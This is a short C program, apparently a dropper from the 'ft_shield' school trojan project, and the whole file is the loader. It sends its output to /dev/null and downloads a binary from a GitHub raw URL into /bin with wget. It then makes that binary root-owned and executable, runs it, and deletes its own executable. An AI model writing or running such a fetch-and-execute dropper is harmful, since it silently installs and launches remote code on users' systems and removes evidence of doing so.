#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>

void run(char *const argv[], const char *path) {
    pid_t pid = fork();
    extern char **environ;
    if (pid == 0) {
        execve(path, argv, environ);
        _exit(EXIT_FAILURE);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
            return;
        }
    }
}


void download_file() {
    char *bin_url = "https://raw.githubusercontent.com/HarounKr/ft_shield/refs/heads/master/bin/ft_shield";

    char *cmd[] = {"wget", "-O", "/bin/ft_shield", bin_url, NULL};

    run(cmd, "/bin/wget");
}

int main(int ac, char **av) {
    (void)ac;
    
    printf("hkrifa\nmisaev\n");
    char *shield_path = "/bin/ft_shield";
    int fd = open("/dev/null", O_RDWR, 0);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);

    download_file();
    char *cmd1[] = {"chown", "root:root", shield_path, NULL};
    char *cmd2[] = {"chmod", "755", shield_path, NULL};
    char *cmd3[] = {shield_path, NULL};
    run(cmd1, "/bin/chown");
    run(cmd2, "/bin/chmod");
    run(cmd3, shield_path);

    close(fd);
    remove(av[0]);

    return 0;
}